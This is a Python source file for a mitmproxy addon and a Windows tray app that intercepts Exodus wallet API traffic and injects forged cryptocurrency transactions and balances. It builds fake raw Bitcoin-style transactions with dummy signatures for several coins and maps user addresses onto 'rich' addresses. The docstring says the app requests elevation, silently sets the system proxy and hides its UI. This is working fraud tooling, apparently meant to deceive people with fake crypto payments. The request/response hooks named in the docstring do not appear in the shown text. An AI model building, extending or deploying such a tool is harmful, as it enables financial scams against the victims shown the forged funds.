#!/usr/bin/env python3
"""
Single-file crypto injector application.

Usage:
  - This file serves two roles:
    1) When imported by `mitmdump -s crypto_injector_app.py` it exposes the
       `request(flow)` and `response(flow)` functions used by mitmproxy.
    2) When run directly, it starts a Windows tray app that: requests
       elevation, sets the Windows proxy to 127.0.0.1:8080, spawns mitmdump
       with this file as the addon, and provides a hidden UI that appears
       on Ctrl+A to manage injected addresses.

Notes:
  - You must have `mitmdump` (from mitmproxy) installed and on PATH.
  - Install required Python packages: see `requirements.txt`.
"""
import os
import re
import json
import time
import base64
import random
import hashlib
import struct
from enum import Enum

# ------------------------
# Addon code (import-safe)
# ------------------------
# The functions below are intentionally free of GUI imports so mitmdump
# can import this module without needing the GUI dependencies.

transaction_cache = {}
last_file_mtime = 0

eth_address_mappings = []
sol_address_mappings = []

# Bumped by GUI reset; mitmdump clears caches when this changes (same process as addon).
_addon_reset_epoch = 0

# txid (hex) -> raw transaction hex (for insight-api fetchRawTx when txs are injected)
rawtx_hex_registry = {}


def _rawtx_hex_for_txid(txid):
    if not txid or len(txid) != 64:
        return None
    k = txid.lower()
    h = rawtx_hex_registry.get(k)
    if h:
        return h
    try:
        return rawtx_hex_registry.get(bytes.fromhex(k)[::-1].hex())
    except Exception:
        return None

# Solana tx signatures (base58) we reported as successfully broadcast after upstream rejected
# the signed wire tx (fake-balance send path). Used to satisfy getSignatureStatuses / getTransaction.
sol_user_broadcast_sigs = {}


def _extract_txid_from_path(path_text):
    p = (path_text or '').lower()
    # common forms: /rawtx/<txid>, /tx/<txid>, ?txid=<txid>, ?hash=<txid>
    m = re.search(r'/rawtx/([0-9a-f]{64})', p)
    if m:
        return m.group(1)
    m = re.search(r'/tx/([0-9a-f]{64})', p)
    if m:
        return m.group(1)
    m = re.search(r'(?:txid|hash|id)=([0-9a-f]{64})', p)
    if m:
        return m.group(1)
    # blockbook / insight variants: ...rawtx/<txid>..., fetch-raw-tx, etc.
    m = re.search(r'(?:rawtx|raw-tx|fetchrawtransaction)[/:]([0-9a-f]{64})', p)
    if m:
        return m.group(1)
    # fallback for unusual routes carrying a txid token
    m = re.search(r'([0-9a-f]{64})', p)
    if m and ('rawtx' in p or '/tx' in p or 'insight' in p or 'blockbook' in p):
        return m.group(1)
    return None


def _extract_txid_from_insight_flow(flow):
    """Txid for rawtx/fetchRawTx: URL path + optional POST/GET body (Exodus insight-api)."""
    chunks = []
    try:
        chunks.append(getattr(flow.request, 'pretty_url', '') or '')
        chunks.append(getattr(flow.request, 'path', '') or '')
    except Exception:
        pass
    combined = ' '.join(chunks)
    tid = _extract_txid_from_path(combined)
    if tid:
        return tid
    body = ''
    try:
        body = (flow.request.content or b'').decode('utf-8', errors='ignore')
    except Exception:
        body = ''
    blob_lower = (combined + ' ' + body).lower()
    try:
        if body:
            for pat in (
                r'"txid"\s*:\s*"([0-9a-fA-F]{64})"',
                r'"txId"\s*:\s*"([0-9a-fA-F]{64})"',
                r'"txhash"\s*:\s*"([0-9a-fA-F]{64})"',
                r'"tx_hash"\s*:\s*"([0-9a-fA-F]{64})"',
                r'txid=([0-9a-fA-F]{64})',
                r'tx_hash=([0-9a-fA-F]{64})',
            ):
                m = re.search(pat, body)
                if m:
                    return m.group(1).lower()
            bl = body.lower()
            m = re.search(r'([0-9a-f]{64})', bl)
            if m and ('txid' in bl or 'raw' in bl or 'hash' in bl):
                return m.group(1)
    except Exception:
        pass
    # Bitcore / insight: .../tx/<txid>/raw, .../<txid>.hex
    try:
        cl = combined.lower()
        m = re.search(r'/tx/([0-9a-f]{64})/raw', cl)
        if m:
            return m.group(1)
        m = re.search(r'/([0-9a-f]{64})\.hex\b', cl)
        if m:
            return m.group(1)
        for param in ('txid', 'tx_hash', 'txhash', 'hash', 'transaction', 'transactionid'):
            m = re.search(rf'(?:^|[?&]){re.escape(param)}=([0-9a-f]{{64}})', cl)
            if m:
                return m.group(1)
    except Exception:
        pass
    # Referer sometimes carries the API URL including txid
    try:
        ref = (flow.request.headers.get('Referer') or '').lower()
        if ref:
            tid = _extract_txid_from_path(ref)
            if tid:
                return tid
            m = re.search(r'/tx/([0-9a-f]{64})', ref)
            if m:
                return m.group(1)
    except Exception:
        pass
    # Exodus UTXO chains (btc/ltc/doge/zec paths); avoid matching EVM tx hashes on clarity APIs
    if _is_exodus_utxo_chain_rawtx_flow(flow):
        try:
            _ensure_utxo_rawtx_registry(flow)
            for m in re.finditer(r'\b([0-9a-f]{64})\b', blob_lower):
                cand = m.group(1)
                if _rawtx_hex_for_txid(cand):
                    return cand
        except Exception:
            pass
    return None


def _ensure_utxo_rawtx_registry(flow):
    """Rebuild rawtx_hex_registry from injected GUI txs (needed on response() replay)."""
    for c in ('BTC', 'LTC', 'DOGE', 'ZEC'):
        try:
            load_injected_transactions(c, flow)
        except Exception:
            pass


def _request_url_body_lower(flow):
    parts = []
    try:
        parts.append(getattr(flow.request, "pretty_url", "") or "")
    except Exception:
        pass
    try:
        parts.append(getattr(flow.request, "path", "") or "")
    except Exception:
        pass
    try:
        if flow.request.content:
            parts.append(flow.request.content.decode("utf-8", errors="ignore"))
    except Exception:
        pass
    return "".join(parts).lower()


def _request_contains_any_address(flow, addresses):
    """True if a 0x or XRP r-address appears in the request URL or body."""
    blob = _request_url_body_lower(flow)
    for a in addresses:
        if not a or not isinstance(a, str):
            continue
        al = a.strip().lower()
        if not al:
            continue
        if al.startswith("0x"):
            if al in blob or al[2:] in blob:
                return True
        elif al.startswith("r") and len(al) >= 26:
            if al in blob:
                return True
        elif al in blob:
            return True
    return False


def _usdt_request_should_inject(flow, injected_usdt):
    """Exodus often omits 'usdt' from eth-clarity URLs; match token hints or wallet address."""
    if not injected_usdt:
        return False
    try:
        ul = (getattr(flow.request, "pretty_url", "") or "").lower()
    except Exception:
        ul = ""
    if any(
        k in ul
        for k in (
            "usdt",
            "tether",
            "dac17f958d2ee523a2206206994597c13d831ec7",
            "erc-20",
            "erc20",
            "/token",
            "token/",
        )
    ):
        return True
    addrs = [tx.get("address") for tx in injected_usdt if tx.get("address")]
    return _request_contains_any_address(flow, addrs)


def _xrp_request_should_inject(flow, injected_xrp):
    if not injected_xrp:
        return False
    try:
        ul = (getattr(flow.request, "pretty_url", "") or "").lower()
    except Exception:
        ul = ""
    if any(k in ul for k in ("ripple", "xrp", "xrpledger", "xrpl")):
        return True
    addrs = [tx.get("address") for tx in injected_xrp if tx.get("address")]
    return _request_contains_any_address(flow, addrs)


def _eth_clarity_transactions_container(response_data):
    """Return (dict_to_mutate, key) for the clarity `transactions` list only (not generic `items`)."""
    if not isinstance(response_data, dict):
        return None, None
    if "transactions" in response_data and isinstance(response_data["transactions"], list):
        return response_data, "transactions"
    data = response_data.get("data")
    if isinstance(data, dict) and "transactions" in data and isinstance(data["transactions"], list):
        return data, "transactions"
    return None, None


def _set_rawtx_response_for_flow(flow, raw_hex):
    """Insight-compatible body: many clients expect raw hex; others want {rawtx, hex}."""
    try:
        from mitmproxy import http
        want_json = _rawtx_response_use_json(flow)
        if want_json:
            body = json.dumps({'rawtx': raw_hex, 'hex': raw_hex}).encode('utf-8')
            flow.response = http.Response.make(
                200, body, {'Content-Type': 'application/json; charset=utf-8'}
            )
        else:
            flow.response = http.Response.make(
                200, raw_hex.encode('utf-8'), {'Content-Type': 'text/plain; charset=utf-8'}
            )
        return True
    except Exception:
        try:
            if flow.response is None:
                return False
            want_json = _rawtx_response_use_json(flow)
            if want_json:
                flow.response.content = json.dumps({'rawtx': raw_hex, 'hex': raw_hex}).encode('utf-8')
                flow.response.headers['Content-Type'] = 'application/json; charset=utf-8'
            else:
                flow.response.content = raw_hex.encode('utf-8')
                flow.response.headers['Content-Type'] = 'text/plain; charset=utf-8'
            flow.response.status_code = 200
            return True
        except Exception:
            return False


def _fetch_remote_state(flow=None):
    """GET /state from GUI; cache JSON on flow.metadata so one mitm flow = one fetch."""
    if flow is not None:
        try:
            m = getattr(flow, 'metadata', None)
            if m is not None and 'injector_remote_state' in m:
                return m['injector_remote_state']
        except Exception:
            pass
    state = None
    try:
        port = os.environ.get('INJECTOR_PORT')
        if not port:
            return None
        import urllib.request
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        with opener.open(f'http://127.0.0.1:{port}/state', timeout=0.5) as resp:
            state = json.load(resp)
    except Exception:
        state = None
    if flow is not None and state is not None:
        try:
            flow.metadata['injector_remote_state'] = state
        except Exception:
            pass
    return state


def _apply_injector_reset_epoch(state):
    """Wipe all addon-side injection state immediately when GUI bumps reset_epoch."""
    global _addon_reset_epoch, transaction_cache, last_file_mtime, eth_address_mappings, sol_address_mappings
    if state is None:
        return
    try:
        epoch = int(state.get('reset_epoch', 0))
    except Exception:
        return
    if epoch != _addon_reset_epoch:
        _addon_reset_epoch = epoch
        transaction_cache.clear()
        last_file_mtime = 0
        eth_address_mappings.clear()
        sol_address_mappings.clear()
        rawtx_hex_registry.clear()
        sol_user_broadcast_sigs.clear()


# When the GUI is running it will optionally serve transactions via a
# simple local HTTP server. The mitmdump addon (separate process) will
# query that server when available. This avoids writing transactions to
# disk while the GUI is open; state lives in-memory and disappears on
# exit.

def load_address_mappings(flow=None):
    """Load ETH and SOL address mappings from GUI /state or `injected_crypto.json`"""
    global eth_address_mappings, sol_address_mappings
    eth_address_mappings = []
    sol_address_mappings = []
    try:
        state = _fetch_remote_state(flow)
        _apply_injector_reset_epoch(state)
        transactions = None
        if state is not None:
            transactions = state.get('transactions')
        if transactions is None and os.path.exists('injected_crypto.json'):
            with open('injected_crypto.json', 'r') as f:
                transactions = json.load(f)

        if transactions:
            for tx in transactions:
                crypto = (tx.get('crypto') or '').upper()
                if crypto == 'ETH':
                    eth_address_mappings.append({
                        'your_address': (tx.get('your_address') or '').lower(),
                        'rich_address': (tx.get('rich_address') or '').lower()
                    })
                elif crypto == 'SOL':
                    sol_address_mappings.append({
                        'your_address': tx.get('your_address'),
                        'rich_address': tx.get('rich_address')
                    })
    except Exception as e:
        print(f"Error loading address mappings: {e}")

def get_transaction_id(address, amount, sender, crypto):
    unique_string = f"{crypto}{address}{amount}{sender}"
    return hashlib.sha256(unique_string.encode()).hexdigest()

def load_injected_transactions(crypto_type, flow=None):
    global transaction_cache, last_file_mtime
    try:
        state = _fetch_remote_state(flow)
        _apply_injector_reset_epoch(state)
        ui_transactions = None
        if state is not None:
            ui_transactions = state.get('transactions')

        # Fall back to file-based transactions if GUI state unavailable.
        if ui_transactions is None:
            if not os.path.exists('injected_crypto.json'):
                transaction_cache.clear()
                last_file_mtime = 0
                return []
            current_mtime = os.path.getmtime('injected_crypto.json')
            if (
                current_mtime == last_file_mtime
                and transaction_cache
                and rawtx_hex_registry
            ):
                return [tx for tx in transaction_cache.values() if tx.get('_crypto_type') == crypto_type]
            last_file_mtime = current_mtime
            with open('injected_crypto.json', 'r') as f:
                ui_transactions = json.load(f)

        transaction_cache.clear()
        rawtx_hex_registry.clear()
        if not ui_transactions:
            return []
        for tx in ui_transactions:
            crypto = (tx.get('crypto') or 'LTC').upper()
            # Skip ETH send records (address replacement handled separately)
            if crypto == 'ETH':
                continue
            creation_time = tx.get('creation_timestamp', time.time())
            # For LTC/BTC/DOGE/ZEC/BNB/USDT/XRP use address/amount
            if crypto in ('LTC', 'BTC', 'DOGE', 'ZEC', 'BNB', 'USDT', 'XRP'):
                addr = tx.get('address')
                amt = tx.get('amount')
                sender = tx.get('sender', '')
                tx_id = get_transaction_id(addr, amt, sender, crypto)
            elif crypto == 'SOL':
                # Allow SOL mapping entries or send transactions from the GUI.
                addr = tx.get('your_address') or tx.get('address')
                amt = tx.get('amount', tx.get('lamports', 0))
                sender = tx.get('sender', '')
                tx_id = get_transaction_id(addr, amt, sender, 'SOL')
            else:
                continue
            if tx_id in transaction_cache:
                continue
            if crypto == 'LTC':
                blockchain_tx = create_fake_ltc_transaction(
                    tx.get('address'), tx.get('amount'), tx.get('sender', ''), tx_id, creation_time
                )
            elif crypto == 'BTC':
                blockchain_tx = create_fake_btc_transaction(
                    tx.get('address'), tx.get('amount'), tx.get('sender', ''), tx_id, creation_time
                )
            elif crypto == 'DOGE':
                blockchain_tx = create_fake_doge_transaction(
                    tx.get('address'), tx.get('amount'), tx.get('sender', ''), tx_id, creation_time
                )
            elif crypto == 'ZEC':
                blockchain_tx = create_fake_zec_transaction(
                    tx.get('address'), tx.get('amount'), tx.get('sender', ''), tx_id, creation_time
                )
            elif crypto == 'BNB':
                blockchain_tx = create_fake_bnb_transaction(
                    tx.get('address'), tx.get('amount'), tx.get('sender', ''), tx_id, creation_time
                )
            elif crypto == 'USDT':
                blockchain_tx = create_fake_usdt_transaction(
                    tx.get('address'), tx.get('amount'), tx.get('sender', ''), tx_id, creation_time
                )
            elif crypto == 'XRP':
                blockchain_tx = create_fake_xrp_transaction(
                    tx.get('address'), tx.get('amount'), tx.get('sender', ''), tx_id, creation_time
                )
            elif crypto == 'SOL':
                # Build a consistent Solana injected entry. Include deterministic signature.
                addr_val = tx.get('your_address') or tx.get('address')
                amt_val = float(tx.get('amount', 0))
                blockchain_tx = {
                    'address': addr_val,
                    'amount': amt_val,
                    'lamports': int(amt_val * 1_000_000_000),
                    'sender': tx.get('sender', 'Random'),
                    'creation_timestamp': creation_time,
                    'confirm_seconds': tx.get('confirm_seconds', 600),
                    'your_address': tx.get('your_address'),
                    'rich_address': tx.get('rich_address')
                }
                try:
                    # create a deterministic signature per tx_id so repeated calls match
                    sig = _make_sol_signature(tx_id)
                    blockchain_tx['_sol_signature'] = sig
                    blockchain_tx['_consistent_id'] = tx_id
                except Exception:
                    pass
            blockchain_tx['_crypto_type'] = crypto
            transaction_cache[tx_id] = blockchain_tx
        return [tx for tx in transaction_cache.values() if tx.get('_crypto_type') == crypto_type]
    except Exception as e:
        print(f"Error loading transactions: {e}")
    return []

def get_confirmations_and_block(creation_time):
    current_time = time.time()
    elapsed_seconds = current_time - creation_time
    if elapsed_seconds < 60:
        return 0, -1
    else:
        return 6, 3040994


# --- Bech32 + rawtx registry (from Bitcoin Core test framework, MIT) ---
CHARSET_BECH32 = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
BECH32_CONST = 1
BECH32M_CONST = 0x2bc830a3


class _Bech32Enc(Enum):
    BECH32 = 1
    BECH32M = 2


def _bech32_polymod(values):
    generator = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ value
        for i in range(5):
            chk ^= generator[i] if ((top >> i) & 1) else 0
    return chk


def _bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]


def _bech32_verify_checksum(hrp, data):
    check = _bech32_polymod(_bech32_hrp_expand(hrp) + data)
    if check == BECH32_CONST:
        return _Bech32Enc.BECH32
    if check == BECH32M_CONST:
        return _Bech32Enc.BECH32M
    return None


def _bech32_decode(bech):
    if (any(ord(x) < 33 or ord(x) > 126 for x in bech)) or (bech.lower() != bech and bech.upper() != bech):
        return (None, None, None)
    bech = bech.lower()
    pos = bech.rfind('1')
    if pos < 1 or pos + 7 > len(bech) or len(bech) > 90:
        return (None, None, None)
    if not all(x in CHARSET_BECH32 for x in bech[pos + 1:]):
        return (None, None, None)
    hrp = bech[:pos]
    data = [CHARSET_BECH32.find(x) for x in bech[pos + 1:]]
    encoding = _bech32_verify_checksum(hrp, data)
    if encoding is None:
        return (None, None, None)
    return (encoding, hrp, data[:-6])


def _convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits):
            return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
        elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
            return None
    return ret


def _decode_segwit_address(hrp, addr):
    encoding, hrpgot, data = _bech32_decode(addr)
    if hrpgot != hrp:
        return (None, None)
    decoded = _convertbits(data[1:], 5, 8, False)
    if decoded is None or len(decoded) < 2 or len(decoded) > 40:
        return (None, None)
    if data[0] > 16:
        return (None, None)
    if data[0] == 0 and len(decoded) != 20 and len(decoded) != 32:
        return (None, None)
    if (data[0] == 0 and encoding != _Bech32Enc.BECH32) or (data[0] != 0 and encoding != _Bech32Enc.BECH32M):
        return (None, None)
    return (data[0], decoded)


def _dhash256(b):
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def _txid_hex_from_raw(raw):
    return _dhash256(raw)[::-1].hex()


def _varint(n):
    if n < 0xfd:
        return struct.pack('<B', n)
    if n <= 0xffff:
        return b'\xfd' + struct.pack('<H', n)
    if n <= 0xffffffff:
        return b'\xfe' + struct.pack('<I', n)
    return b'\xff' + struct.pack('<Q', n)


def _serialize_legacy_tx(version, inputs, outputs, locktime=0):
    out = struct.pack('<I', version)
    out += _varint(len(inputs))
    for inp in inputs:
        out += inp['prev_hash']
        out += struct.pack('<I', inp['vout'])
        out += _varint(len(inp['script']))
        out += inp['script']
        out += struct.pack('<I', inp.get('sequence', 0xffffffff))
    out += _varint(len(outputs))
    for o in outputs:
        out += struct.pack('<Q', o['value'])
        out += _varint(len(o['script']))
        out += o['script']
    out += struct.pack('<I', locktime)
    return out


def _b58decode_check(addr):
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num = 0
    for c in addr:
        num = num * 58 + alphabet.index(c)
    pad = 0
    for c in addr:
        if c == '1':
            pad += 1
        else:
            break
    combined = num.to_bytes((num.bit_length() + 7) // 8 or 1, 'big')
    full = b'\x00' * pad + combined
    if len(full) < 4:
        raise ValueError('bad address')
    payload, checksum = full[:-4], full[-4:]
    if hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4] != checksum:
        raise ValueError('bad address checksum')
    return payload


def _hash160_from_base58_addr(addr):
    p = _b58decode_check(addr)
    if len(p) == 21:
        return p[1:21]
    if len(p) == 22 and addr.startswith('t1'):
        return p[2:22]
    raise ValueError('unsupported base58 address')


def _script_pubkey_for_address(addr):
    a = (addr or '').strip()
    al = a.lower()
    if al.startswith('bc1'):
        wv, prog = _decode_segwit_address('bc', a)
        if wv is None or prog is None:
            raise ValueError('bc1')
        if wv == 0 and len(prog) == 20:
            return bytes([0x00, 0x14]) + prog
        if wv == 0 and len(prog) == 32:
            return bytes([0x00, 0x20]) + prog
        if wv == 1 and len(prog) == 32:
            return bytes([0x51, 0x20]) + prog
        raise ValueError('bc1 witness')
    if al.startswith('tb1'):
        wv, prog = _decode_segwit_address('tb', a)
        if wv is None or prog is None:
            raise ValueError('tb1')
        if wv == 0 and len(prog) == 20:
            return bytes([0x00, 0x14]) + prog
        if wv == 0 and len(prog) == 32:
            return bytes([0x00, 0x20]) + prog
        if wv == 1 and len(prog) == 32:
            return bytes([0x51, 0x20]) + prog
        raise ValueError('tb1 witness')
    p = _b58decode_check(a)
    if len(p) == 21 and p[0] == 0x05:
        return bytes([0xa9, 0x14]) + p[1:21] + bytes([0x87])
    h = _hash160_from_base58_addr(a)
    return bytes([0x76, 0xa9, 0x14]) + h + bytes([0x88, 0xac])


def _register_rawtx_bytes(raw):
    tid = _txid_hex_from_raw(raw)
    h = raw.hex()
    tlow = tid.lower()
    rawtx_hex_registry[tlow] = h
    try:
        alt = bytes.fromhex(tid)[::-1].hex().lower()
        if alt != tlow:
            rawtx_hex_registry[alt] = h
    except Exception:
        pass


def _is_exodus_utxo_chain_rawtx_flow(flow):
    """True if request is likely UTXO raw-tx fetch on Exodus (not EVM/SOL clarity)."""
    try:
        host = (flow.request.host or '').lower()
        path = (flow.request.path or '').lower()
        url = (flow.request.pretty_url or '').lower()
    except Exception:
        return False
    if 'exodus' not in host and 'exodus' not in url:
        return False
    if any(
        x in path or x in url
        for x in (
            'eth-clarity',
            'bsc-clarity',
            'solana',
            'erc20',
            'ethereum',
        )
    ):
        return False
    if any(
        x in path or x in url
        for x in (
            'bitcoin',
            'btc',
            'litecoin',
            'dogecoin',
            'zcash',
            'rawtx',
            'raw-tx',
            'fetchraw',
            '/tx/',
            'blockbook',
            'insight',
        )
    ):
        return True
    blob = path + url
    if re.search(r'[0-9a-f]{64}', blob):
        return True
    return False


def _rawtx_response_use_json(flow):
    try:
        req_path = (flow.request.path or '').lower()
        url_l = (flow.request.pretty_url or '').lower()
        accept = (flow.request.headers.get('Accept') or '').lower()
    except Exception:
        return False
    if 'format=json' in req_path or 'format=json' in url_l:
        return True
    if req_path.endswith('.json'):
        return True
    if '/api/' in req_path and 'application/json' in accept:
        return True
    if 'application/json' in accept:
        return True
    return False


def _build_utxo_chain_with_raw(sender_address, receiver_address, amount, seed_str):
    """Coinbase-like tx A then spend tx B; register raw hex for both txids."""
    rng = random.Random(int(hashlib.sha256(seed_str.encode('utf-8')).hexdigest()[:16], 16))
    amount_sat = max(1, int(round(float(amount) * 1e8)))
    fee_sat = 10000
    spk_send = _script_pubkey_for_address(sender_address)
    spk_recv = _script_pubkey_for_address(receiver_address)
    coinbase_body = bytes([0x03, 0x01, 0x00, 0x00]) + rng.randbytes(4)
    script_sig_cb = _varint(len(coinbase_body)) + coinbase_body
    ins_a = [{
        'prev_hash': b'\x00' * 32,
        'vout': 0xffffffff,
        'script': script_sig_cb,
        'sequence': 0xffffffff,
    }]
    outs_a = [{'value': amount_sat + fee_sat, 'script': spk_send}]
    raw_a = _serialize_legacy_tx(1, ins_a, outs_a, 0)
    _register_rawtx_bytes(raw_a)
    txid_a = _txid_hex_from_raw(raw_a)
    prev_b = bytes.fromhex(txid_a)[::-1]
    dummy_sig = rng.randbytes(105)
    script_sig_b = _varint(len(dummy_sig)) + dummy_sig
    ins_b = [{'prev_hash': prev_b, 'vout': 0, 'script': script_sig_b, 'sequence': 0xffffffff}]
    outs_b = [{'value': amount_sat, 'script': spk_recv}]
    raw_b = _serialize_legacy_tx(1, ins_b, outs_b, 0)
    _register_rawtx_bytes(raw_b)
    txid_b = _txid_hex_from_raw(raw_b)
    return txid_b, txid_a, spk_recv


def _utxo_fake_json(crypto, address, amount, sender_address, consistent_id, creation_time, vsize_hint):
    """Build injected tx JSON + rawtx registry for UTXO chains; fallback to old random ids."""
    seed = (consistent_id or '') + str(amount) + (address or '') + crypto
    try:
        txid, input_txid, spk_recv = _build_utxo_chain_with_raw(sender_address, address, amount, seed)
    except Exception:
        return None
    confirmations, blockheight = get_confirmations_and_block(creation_time)
    if crypto in ('LTC', 'DOGE', 'ZEC'):
        if confirmations == 0:
            confirmations = 1
        if blockheight == -1:
            blockheight = (int(time.time()) % 100000) + 1000000
    if crypto == 'BTC' and blockheight != -1:
        blockheight = 880000
    return {
        'fees': fee_sat / 1e8 if (fee_sat := 10000) else 0.00001,
        'txid': txid,
        'time': int(creation_time),
        'blockheight': blockheight,
        'confirmations': confirmations if confirmations else 1,
        'vsize': vsize_hint,
        'vin': [{
            'txid': input_txid,
            'vout': 0,
            'value': str(amount),
            'addr': sender_address,
        }],
        'vout': [{
            'n': 0,
            'scriptPubKey': {'addresses': [address], 'hex': spk_recv.hex()},
            'value': str(amount),
        }],
    }


def create_fake_ltc_transaction(address, amount, sender_address="", consistent_id=None, creation_time=None):
    if creation_time is None:
        creation_time = time.time()
    if not sender_address or sender_address == "Random":
        if consistent_id:
            random.seed(consistent_id)
            sender_address = f"L{''.join(random.choices('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz', k=33))}"
            random.seed()
        else:
            sender_address = f"L{''.join(random.choices('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz', k=33))}"
    tx = _utxo_fake_json('LTC', address, amount, sender_address, consistent_id, creation_time, 226)
    if tx:
        tx['fees'] = 0.00001
        return tx
    return {"fees": 0.00001, "txid": (consistent_id[:64] if consistent_id else ''.join(random.choices('0123456789abcdef', k=64))), "time": int(creation_time), "blockheight": (int(time.time()) % 100000) + 1000000, "confirmations": 1, "vsize": 226, "vin": [{"txid": ''.join(random.choices('0123456789abcdef', k=64)), "vout": 0, "value": str(amount), "addr": sender_address}], "vout": [{"n": 0, "scriptPubKey": {"addresses": [address], "hex": "76a914" + ''.join(random.choices('0123456789abcdef', k=40)) + "88ac"}, "value": str(amount)}]}


def create_fake_btc_transaction(address, amount, sender_address="", consistent_id=None, creation_time=None):
    if creation_time is None:
        creation_time = time.time()
    if not sender_address or sender_address == "Random":
        if consistent_id:
            random.seed(consistent_id)
            sender_address = f"bc1q{''.join(random.choices('023456789acdefghjklmnpqrstuvwxyz', k=38))}"
            random.seed()
        else:
            sender_address = f"bc1q{''.join(random.choices('023456789acdefghjklmnpqrstuvwxyz', k=38))}"
    tx = _utxo_fake_json('BTC', address, amount, sender_address, consistent_id, creation_time, 110)
    if tx:
        tx['fees'] = 0.0000052
        return tx
    return {"fees": 0.0000052, "txid": (consistent_id[:64] if consistent_id else ''.join(random.choices('0123456789abcdef', k=64))), "time": int(creation_time), "blockheight": 880000, "confirmations": 1, "vsize": 110, "vin": [{"txid": ''.join(random.choices('0123456789abcdef', k=64)), "vout": 0, "value": str(amount), "addr": sender_address}], "vout": [{"n": 0, "scriptPubKey": {"addresses": [address], "hex": "0014" + ''.join(random.choices('0123456789abcdef', k=40))}, "value": str(amount)}]}


def create_fake_doge_transaction(address, amount, sender_address="", consistent_id=None, creation_time=None):
    if creation_time is None:
        creation_time = time.time()
    if not sender_address or sender_address == "Random":
        if consistent_id:
            random.seed(consistent_id)
            sender_address = f"D{''.join(random.choices('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz', k=33))}"
            random.seed()
        else:
            sender_address = f"D{''.join(random.choices('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz', k=33))}"
    tx = _utxo_fake_json('DOGE', address, amount, sender_address, consistent_id, creation_time, 226)
    if tx:
        tx['fees'] = 0.001
        return tx
    return {"fees": 0.001, "txid": (consistent_id[:64] if consistent_id else ''.join(random.choices('0123456789abcdef', k=64))), "time": int(creation_time), "blockheight": (int(time.time()) % 100000) + 1000000, "confirmations": 1, "vsize": 226, "vin": [{"txid": ''.join(random.choices('0123456789abcdef', k=64)), "vout": 0, "value": str(amount), "addr": sender_address}], "vout": [{"n": 0, "scriptPubKey": {"addresses": [address], "hex": "76a914" + ''.join(random.choices('0123456789abcdef', k=40)) + "88ac"}, "value": str(amount)}]}


def create_fake_zec_transaction(address, amount, sender_address="", consistent_id=None, creation_time=None):
    if creation_time is None:
        creation_time = time.time()
    if not sender_address or sender_address == "Random":
        if consistent_id:
            random.seed(consistent_id)
            sender_address = f"t1{''.join(random.choices('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz', k=33))}"
            random.seed()
        else:
            sender_address = f"t1{''.join(random.choices('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz', k=33))}"
    tx = _utxo_fake_json('ZEC', address, amount, sender_address, consistent_id, creation_time, 226)
    if tx:
        tx['fees'] = 0.0001
        return tx
    return {"fees": 0.0001, "txid": (consistent_id[:64] if consistent_id else ''.join(random.choices('0123456789abcdef', k=64))), "time": int(creation_time), "blockheight": (int(time.time()) % 100000) + 1000000, "confirmations": 1, "vsize": 226, "vin": [{"txid": ''.join(random.choices('0123456789abcdef', k=64)), "vout": 0, "value": str(amount), "addr": sender_address}], "vout": [{"n": 0, "scriptPubKey": {"addresses": [address], "hex": "76a914" + ''.join(random.choices('0123456789abcdef', k=40)) + "88ac"}, "value": str(amount)}]}

def create_fake_bnb_transaction(address, amount, sender_address="", consistent_id=None, creation_time=None):
    """Create an account-style BNB (BSC) transaction object compatible
    with the Exodus `bsc-clarity` transactions response format.
    """
    if creation_time is None:
        creation_time = time.time()
    confirmations, blockheight = get_confirmations_and_block(creation_time)
    if consistent_id:
        txhash = consistent_id[:64]
    else:
        txhash = ''.join(random.choices('0123456789abcdef', k=64))
    if not sender_address or sender_address == "Random":
        if consistent_id:
            random.seed(consistent_id)
            sender_address = f"0x{''.join(random.choices('0123456789abcdef', k=40))}"
            random.seed()
        else:
            sender_address = f"0x{''.join(random.choices('0123456789abcdef', k=40))}"
    # Default gas values for a simple transfer
    gas = 21000
    gas_price = 50000000
    gas_used = 21000
    # Treat GUI-entered `amount` as whole BNB tokens; convert to wei (1 BNB = 1e18)
    try:
        value_wei = str(int(float(amount) * (10 ** 18)))
    except Exception:
        try:
            value_wei = str(int(float(amount)))
        except Exception:
            value_wei = '0'
    tx = {
        "blockNumber": blockheight if blockheight != -1 else -1,
        "type": "0x0",
        "hash": f"0x{txhash}",
        "transactionIndex": "0",
        "nonce": "0",
        "gas": str(gas),
        "gasPrice": str(gas_price),
        "gasPriceEffective": str(gas_price),
        "gasUsed": str(gas_used),
        # cumulative should be at least gas_used to pass sanity checks
        "gasUsedCumulative": str(gas_used),
        "to": (address or '').lower(),
        "from": (sender_address or '').lower(),
        # timestamp in milliseconds as hex (Exodus expects ms)
        "timestamp": hex(int(creation_time * 1000)),
        "value": value_wei,
        "status": "1",
        "error": None,
        "input": "0x",
        "effects": [],
        "methodId": "0x",
        "confirmations": int(confirmations) if int(confirmations) > 0 else 1,
        "walletChanges": [
            {"wallet": (address or '').lower(), "type": "balance", "from": "0", "to": value_wei, "contract": None},
            {"wallet": (address or '').lower(), "type": "nonce", "from": "0", "to": "0", "contract": None}
        ],
        "extraData": {}
    }
    return tx

